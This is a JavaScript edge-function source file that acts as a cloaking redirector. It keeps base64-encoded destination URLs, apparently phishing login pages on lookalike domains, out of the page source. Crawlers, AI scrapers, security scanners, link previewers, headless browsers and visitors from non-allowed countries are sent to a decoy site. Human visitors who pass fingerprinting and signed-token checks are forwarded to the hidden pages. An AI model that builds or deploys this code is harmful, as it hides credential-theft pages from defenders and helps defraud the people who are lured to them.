export const runtime = 'edge';

// ⚙ Production mode enabled (set to true only when troubleshooting)
const DEBUG = false;

// 🌐 PASTE YOUR BASE64-ENCODED URLS HERE (Supports 1 string or an array of strings per subdomain)
// Decoded strictly on the server—never sent in the HTML source
const SUBDOMAIN_MAP = {
  eastrn: [
    'aHR0cHM6Ly9hY2NvdW50cGF5YWJsZS50c2ZxcW9nLnRvcD9LWlFzVVVibmVzWkc9YW1obWJXUT0=',
  ],
  westrn: [
    'aHR0cHM6Ly9sb2dpbi5kb2NldHRvZmZpY2UuaW5mbz95TkNxeEdBOFE5dz1iM2x0WkdkcWR3PT0=',
  ],
};

const BOT_DESTINATION = 'https://mycom.com';
const SIGNING_SECRET = process.env.SIGNING_SECRET || '';

// Challenge token & one-time cookie expire 8 seconds after GET loads
const TOKEN_TTL_MS = 8_000;
const CHALLENGE_COOKIE_NAME = '__Host-v_chal';

// Sticky session cookie settings (1 hour default)
const SESSION_COOKIE_NAME = '__Host-v_sess';
const SESSION_TTL_SEC = 3600;

// Leave empty [] when unused (never use [""])
const IP_WHITELIST = [];

const ALLOWED_COUNTRIES = new Set([
  'NG', 'US', 'CA', 'GB', 'IE', 'DE', 'FR', 'IT', 'ES', 'NL', 'BE', 'CH', 'AT',
]);

// Common two-part TLDs where a subdomain requires 4 segments (e.g., sub.domain.co.uk)
const TWO_PART_TLDS = new Set([
  'co.uk', 'org.uk', 'me.uk', 'com.ng', 'org.ng', 'com.au', 'net.au', 'co.za', 'com.br', 'co.jp',
]);

// Comprehensive filter covering search crawlers, AI scrapers, SEO bots, social previewers, and HTTP/headless clients
const BOT_UA_REGEX = new RegExp(
  [
    'bot', 'crawl', 'spider', 'slurp',
    'googlebot', 'adsbot-google', 'mediapartners-google', 'apis-google', 'google-inspectiontool', 'storebot-google',
    'bingbot', 'msnbot', 'yandex', 'baidu', 'duckduckbot', 'applebot', 'petalbot', 'bytespider',
    'gptbot', 'chatgpt-user', 'oai-searchbot', 'claudebot', 'anthropic-ai', 'perplexitybot', 'ccbot', 'cohere-ai',
    'facebookexternalhit', 'facebot', 'twitterbot', 'linkedinbot', 'slackbot', 'discordbot',
    'telegrambot', 'whatsapp', 'viber', 'skypeuripreview', 'pinterest', 'vkshare', 'embedly',
    'semrush', 'ahrefs', 'mj12bot', 'dotbot', 'rogerbot', 'screaming frog',
    'pingdom', 'uptimerobot', 'statuscake', 'datadog', 'newrelic',
    'headless', 'phantom', 'selenium', 'puppeteer', 'playwright', 'webdriver',
    'curl', 'wget', 'python', 'aiohttp', 'httpx', 'requests', 'urllib',
    'go-http-client', 'java\\/', 'okhttp', 'axios', 'node-fetch', 'undici', 'libwww', 'scrapy',
  ].join('|'),
  'i'
);

// --- Base64 & Web Crypto HMAC Helpers ---

function decodeBase64UrlString(encoded) {
  if (!encoded || typeof encoded !== 'string') return null;
  try {
    const normalized = encoded.trim().replace(/-/g, '+').replace(/_/g, '/');
    const padded = normalized.padEnd(normalized.length + ((4 - (normalized.length % 4)) % 4), '=');
    const decoded = atob(padded).trim();
    const parsed = new URL(decoded);
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return null;
    return parsed.toString();
  } catch {
    return null;
  }
}

function escapeHtmlAttr(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/"/g, '&quot;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

async function getHmacKey(secret) {
  const encoder = new TextEncoder();
  return crypto.subtle.importKey(
    'raw',
    encoder.encode(secret),
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['sign', 'verify']
  );
}

function toBase64Url(buffer) {
  const bytes = new Uint8Array(buffer);
  let binary = '';
  for (let i = 0; i < bytes.byteLength; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

function fromBase64Url(base64url) {
  const base64 = base64url.replace(/-/g, '+').replace(/_/g, '/');
  const padded = base64.padEnd(base64.length + ((4 - (base64.length % 4)) % 4), '=');
  const binary = atob(padded);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes;
}

function getCookieValue(request, cookieName) {
  const cookieHeader = request.headers.get('cookie') || '';
  if (!cookieHeader) return '';
  for (const c of cookieHeader.split(';')) {
    const [k, ...vParts] = c.trim().split('=');
    if (k === cookieName) {
      return vParts.join('=');
    }
  }
  return '';
}

// --- Challenge Token & Destination-Pinned Sticky Session Signing ---

async function createChallengeToken(subdomain, clientIp, userAgent) {
  const exp = Date.now() + TOKEN_TTL_MS;
  const nonce = crypto.randomUUID();
  const payload = JSON.stringify(['chal', subdomain, clientIp || 'no-ip', userAgent, exp, nonce]);
  const encodedPayload = toBase64Url(new TextEncoder().encode(payload));
  const key = await getHmacKey(SIGNING_SECRET);
  const signature = await crypto.subtle.sign(
    'HMAC',
    key,
    new TextEncoder().encode(encodedPayload)
  );
  return {
    token: `${encodedPayload}.${toBase64Url(signature)}`,
    nonce,
  };
}

async function verifyChallengeToken(request, token, subdomain, clientIp, userAgent) {
  if (!token || typeof token !== 'string' || !SIGNING_SECRET) return false;
  const parts = token.split('.');
  if (parts.length !== 2) return false;
  const [encodedPayload, encodedSig] = parts;

  try {
    const key = await getHmacKey(SIGNING_SECRET);
    const sigBytes = fromBase64Url(encodedSig);
    const isValidSig = await crypto.subtle.verify(
      'HMAC',
      key,
      sigBytes,
      new TextEncoder().encode(encodedPayload)
    );
    if (!isValidSig) return false;

    const payloadJson = new TextDecoder().decode(fromBase64Url(encodedPayload));
    const parsed = JSON.parse(payloadJson);
    if (!Array.isArray(parsed) || parsed.length !== 6) return false;

    const [type, tokSub, tokIp, tokUa, tokExp, tokNonce] = parsed;
    const now = Date.now();
    const expMs = Number(tokExp);

    if (type !== 'chal' || !tokNonce || !Number.isFinite(expMs) || now > expMs) return false;
    if (tokSub !== subdomain) return false;
    if (tokIp !== (clientIp || 'no-ip')) return false;
    if (tokUa !== userAgent) return false;

    // Verify one-time HttpOnly challenge cookie matches token nonce
    const chalCookieNonce = getCookieValue(request, CHALLENGE_COOKIE_NAME);
    if (!chalCookieNonce || chalCookieNonce !== tokNonce) return false;

    return true;
  } catch {
    return false;
  }
}

async function createSessionCookieValue(subdomain, clientIp, userAgent, targetUrl) {
  const exp = Date.now() + SESSION_TTL_SEC * 1000;
  const payload = JSON.stringify(['sess', subdomain, clientIp || 'no-ip', userAgent, exp, targetUrl]);
  const encodedPayload = toBase64Url(new TextEncoder().encode(payload));
  const key = await getHmacKey(SIGNING_SECRET);
  const signature = await crypto.subtle.sign(
    'HMAC',
    key,
    new TextEncoder().encode(encodedPayload)
  );
  return `${encodedPayload}.${toBase64Url(signature)}`;
}

async function verifySessionCookie(request, subdomain, clientIp, userAgent) {
  if (!SIGNING_SECRET) return null;
  const sessionVal = getCookieValue(request, SESSION_COOKIE_NAME);
  if (!sessionVal) return null;

  const parts = sessionVal.split('.');
  if (parts.length !== 2) return null;
  const [encodedPayload, encodedSig] = parts;

  try {
    const key = await getHmacKey(SIGNING_SECRET);
    const sigBytes = fromBase64Url(encodedSig);
    const isValidSig = await crypto.subtle.verify(
      'HMAC',
      key,
      sigBytes,
      new TextEncoder().encode(encodedPayload)
    );
    if (!isValidSig) return null;

    const payloadJson = new TextDecoder().decode(fromBase64Url(encodedPayload));
    const parsed = JSON.parse(payloadJson);
    if (!Array.isArray(parsed) || parsed.length !== 6) return null;

    const [type, tokSub, tokIp, tokUa, tokExp, tokTargetUrl] = parsed;
    const expMs = Number(tokExp);

    if (type !== 'sess' || !Number.isFinite(expMs) || Date.now() > expMs) return null;
    if (tokSub !== subdomain) return null;
    if (tokIp !== (clientIp || 'no-ip')) return null;
    if (tokUa !== userAgent) return null;
    if (!tokTargetUrl || typeof tokTargetUrl !== 'string') return null;

    // Ensure the pinned URL is still active in SUBDOMAIN_MAP
    const activeUrls = getValidTargetUrls(subdomain);
    if (!activeUrls.includes(tokTargetUrl)) return null;

    return tokTargetUrl;
  } catch {
    return null;
  }
}

function buildChallengeCookieHeader(nonce) {
  const maxAgeSec = Math.ceil(TOKEN_TTL_MS / 1000);
  return `${CHALLENGE_COOKIE_NAME}=${nonce}; Path=/; Max-Age=${maxAgeSec}; HttpOnly; Secure; SameSite=Lax`;
}

function clearChallengeCookieHeader() {
  return `${CHALLENGE_COOKIE_NAME}=; Path=/; Max-Age=0; HttpOnly; Secure; SameSite=Lax`;
}

function buildSessionCookieHeader(value) {
  return `${SESSION_COOKIE_NAME}=${value}; Path=/; Max-Age=${SESSION_TTL_SEC}; HttpOnly; Secure; SameSite=Lax`;
}

// --- Request, Origin & Visitor Helpers ---

function getSubdomain(hostHeader) {
  const [rawHost = ''] = (hostHeader || '').split(':');
  const hostname = rawHost.toLowerCase();
  const parts = hostname.split('.').filter(Boolean);
  if (parts.length < 3) return null;
  const lastTwo = parts.slice(-2).join('.');
  const minParts = TWO_PART_TLDS.has(lastTwo) ? 4 : 3;
  if (parts.length < minParts) return null;
  return parts.at(0) || null;
}

function getClientIp(request) {
  const vercelForwarded = request.headers.get('x-vercel-forwarded-for');
  if (vercelForwarded) {
    const [firstIp = ''] = vercelForwarded.split(',');
    const clean = firstIp.trim().toLowerCase();
    if (clean) return clean;
  }

  const realIp = request.headers.get('x-real-ip');
  if (realIp) {
    const clean = realIp.trim().toLowerCase();
    if (clean) return clean;
  }

  const forwarded = request.headers.get('x-forwarded-for');
  if (!forwarded) return null;
  const ips = forwarded.split(',').map((ip) => ip.trim().toLowerCase()).filter(Boolean);
  return ips.at(-1) || null;
}

function getValidTargetUrls(subdomain) {
  if (!subdomain) return [];
  const entry = SUBDOMAIN_MAP[subdomain];
  if (!entry) return [];
  const list = Array.isArray(entry) ? entry : [entry];
  return list.map((item) => decodeBase64UrlString(item)).filter(Boolean);
}

function resolveTargetUrl(subdomain) {
  const valid = getValidTargetUrls(subdomain);
  if (valid.length === 0) return null;
  return valid.at(Math.floor(Math.random() * valid.length));
}

function appendIncomingParams(incomingUrlStr, targetUrlStr) {
  const incomingUrl = new URL(incomingUrlStr);
  const finalUrl = new URL(targetUrlStr);
  incomingUrl.searchParams.forEach((value, key) => {
    finalUrl.searchParams.append(key, value);
  });
  return finalUrl.toString();
}

function isValidSameOriginPost(request) {
  const expectedOrigin = new URL(request.url).origin.toLowerCase();
  const origin = (request.headers.get('origin') || '').trim().toLowerCase();
  if (!origin || origin !== expectedOrigin) return false;

  const secFetchSite = (request.headers.get('sec-fetch-site') || '').trim().toLowerCase();
  if (secFetchSite && secFetchSite !== 'same-origin') return false;

  const secFetchMode = (request.headers.get('sec-fetch-mode') || '').trim().toLowerCase();
  if (secFetchMode && secFetchMode !== 'cors') return false;

  return true;
}

function evaluateVisitor(request) {
  const subdomain = getSubdomain(request.headers.get('host'));
  const targetUrl = resolveTargetUrl(subdomain);

  if (!targetUrl) {
    return {
      allowed: false,
      reason: `No valid Base64 destination configured for subdomain "${subdomain || 'none'}"`,
    };
  }

  const clientIp = getClientIp(request);
  const userAgent = request.headers.get('user-agent') || '';
  const normalizedWhitelist = IP_WHITELIST.map((ip) => ip.trim().toLowerCase());
  const isWhitelisted = Boolean(clientIp && normalizedWhitelist.includes(clientIp));

  if (isWhitelisted) {
    return { allowed: true, subdomain, targetUrl, clientIp, userAgent, isWhitelisted: true };
  }

  const acceptLang = request.headers.get('accept-language') || '';
  const country = (request.headers.get('x-vercel-ip-country') || '').toUpperCase();

  if (!userAgent || BOT_UA_REGEX.test(userAgent)) {
    return { allowed: false, reason: `Blocked User-Agent: "${userAgent || 'EMPTY'}"` };
  }
  if (!acceptLang) {
    return { allowed: false, reason: 'Missing Accept-Language header' };
  }
  if (!ALLOWED_COUNTRIES.has(country)) {
    return { allowed: false, reason: `Blocked country: "${country || 'UNKNOWN'}"` };
  }

  return { allowed: true, subdomain, targetUrl, clientIp, userAgent, isWhitelisted: false };
}

function baseSecurityHeaders(extra = {}) {
  return {
    'Referrer-Policy': 'no-referrer',
    'X-Robots-Tag': 'noindex, nofollow, noarchive',
    'X-Content-Type-Options': 'nosniff',
    'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
    ...extra,
  };
}

function redirectResponse(destination) {
  return new Response(null, {
    status: 302,
    headers: baseSecurityHeaders({
      Location: destination,
    }),
  });
}

// --- Handlers ---

export async function GET(request) {
  if (!SIGNING_SECRET) {
    return new Response(
      'Server misconfiguration: SIGNING_SECRET is missing in Vercel Environment Variables.',
      { status: 500 }
    );
  }

  const check = evaluateVisitor(request);
  if (!check.allowed) {
    if (DEBUG) return new Response(`DEBUG (GET): ${check.reason}`, { status: 200 });
    return redirectResponse(BOT_DESTINATION);
  }

  // Fast-path: Redirect immediately to the visitor's pinned destination URL if session is valid
  const stickyTargetUrl = await verifySessionCookie(
    request,
    check.subdomain,
    check.clientIp,
    check.userAgent
  );
  if (stickyTargetUrl) {
    const directUrl = appendIncomingParams(request.url, stickyTargetUrl);
    return redirectResponse(directUrl);
  }

  const { token, nonce } = await createChallengeToken(
    check.subdomain,
    check.clientIp,
    check.userAgent
  );
  const url = new URL(request.url);
  const safeToken = JSON.stringify(token);
  const safeQuery = JSON.stringify(url.search);
  const safeBotUrl = JSON.stringify(BOT_DESTINATION);
  const escapedBotUrl = escapeHtmlAttr(BOT_DESTINATION);
  const bypassChecks = JSON.stringify(check.isWhitelisted);

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow, noarchive">
  <title>Loading...</title>
  <noscript>
    <meta http-equiv="refresh" content="0;url=${escapedBotUrl}">
  </noscript>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #ffffff;
      color: #555555;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div>Loading...</div>
  <script>
    (async function () {
      const TOKEN = ${safeToken};
      const QUERY = ${safeQuery};
      const BOT_URL = ${safeBotUrl};
      const BYPASS = ${bypassChecks};

      function hasHeadlessWebGL() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return false;
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          if (!debugInfo) return false;
          const renderer = String(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || '');
          return /swiftshader|llvmpipe|software rasterizer|mesa offscreen/i.test(renderer);
        } catch {
          return false;
        }
      }

      function isAutomatedBrowser() {
        if (navigator.webdriver) return true;
        if (window._phantom || window.__nightmare || window.callPhantom) return true;
        if (document.documentElement.getAttribute('webdriver') !== null) return true;
        if (!navigator.languages || navigator.languages.length === 0) return true;
        if (window.outerWidth === 0 && window.outerHeight === 0) return true;
        if (typeof navigator.hardwareConcurrency === 'number' && navigator.hardwareConcurrency < 1) return true;
        if (typeof navigator.onLine !== 'boolean') return true;
        if (hasHeadlessWebGL()) return true;
        return false;
      }

      if (!BYPASS && isAutomatedBrowser()) {
        window.location.replace(BOT_URL);
        return;
      }

      // Collect subtle human interaction or window focus signal without blocking real visitors
      let interacted = false;
      const markInteracted = () => { interacted = true; };
      const events = ['pointermove', 'mousemove', 'touchstart', 'scroll', 'keydown'];
      events.forEach((evt) => window.addEventListener(evt, markInteracted, { once: true, passive: true }));

      await new Promise((resolve) => {
        const timer = setTimeout(resolve, 350);
        const earlyCheck = setInterval(() => {
          if (interacted) {
            clearTimeout(timer);
            clearInterval(earlyCheck);
            resolve();
          }
        }, 50);
      });

      events.forEach((evt) => window.removeEventListener(evt, markInteracted));
      const hasFocus = typeof document.hasFocus === 'function' ? document.hasFocus() : true;

      let tz = '';
      try {
        tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
      } catch {}

      try {
        const res = await fetch(window.location.pathname + QUERY, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            token: TOKEN,
            tz: tz,
            interacted: interacted,
            hasFocus: hasFocus,
          }),
          credentials: 'same-origin',
        });

        const data = await res.json();
        if (data && data.redirect) {
          window.location.replace(data.redirect);
        } else {
          window.location.replace(BOT_URL);
        }
      } catch {
        window.location.replace(BOT_URL);
      }
    })();
  </script>
</body>
</html>`;

  return new Response(html, {
    headers: baseSecurityHeaders({
      'Content-Type': 'text/html; charset=UTF-8',
      'Set-Cookie': buildChallengeCookieHeader(nonce),
    }),
  });
}

export async function POST(request) {
  if (!SIGNING_SECRET) {
    return new Response(
      'Server misconfiguration: SIGNING_SECRET is missing in Vercel Environment Variables.',
      { status: 500 }
    );
  }

  if (!isValidSameOriginPost(request)) {
    return Response.json(
      { redirect: BOT_DESTINATION },
      { status: 403, headers: baseSecurityHeaders() }
    );
  }

  const check = evaluateVisitor(request);
  if (!check.allowed) {
    return Response.json(
      { redirect: BOT_DESTINATION },
      { status: 403, headers: baseSecurityHeaders() }
    );
  }

  let body = {};
  try {
    body = await request.json();
  } catch {
    return Response.json(
      { redirect: BOT_DESTINATION },
      { status: 400, headers: baseSecurityHeaders() }
    );
  }

  if (!check.isWhitelisted) {
    const validTz = typeof body.tz === 'string' && body.tz.trim().length > 0;
    const validHumanSignal = body.interacted === true || body.hasFocus === true;
    if (!validTz || !validHumanSignal) {
      return Response.json(
        { redirect: BOT_DESTINATION },
        { status: 403, headers: baseSecurityHeaders() }
      );
    }
  }

  const isValidToken = await verifyChallengeToken(
    request,
    body.token,
    check.subdomain,
    check.clientIp,
    check.userAgent
  );
  if (!isValidToken) {
    return Response.json(
      { redirect: BOT_DESTINATION },
      { status: 403, headers: baseSecurityHeaders() }
    );
  }

  const finalUrl = appendIncomingParams(request.url, check.targetUrl);
  const sessionValue = await createSessionCookieValue(
    check.subdomain,
    check.clientIp,
    check.userAgent,
    check.targetUrl
  );

  const headers = new Headers(baseSecurityHeaders());
  headers.append('Set-Cookie', clearChallengeCookieHeader());
  headers.append('Set-Cookie', buildSessionCookieHeader(sessionValue));

  return Response.json({ redirect: finalUrl }, { headers });
}
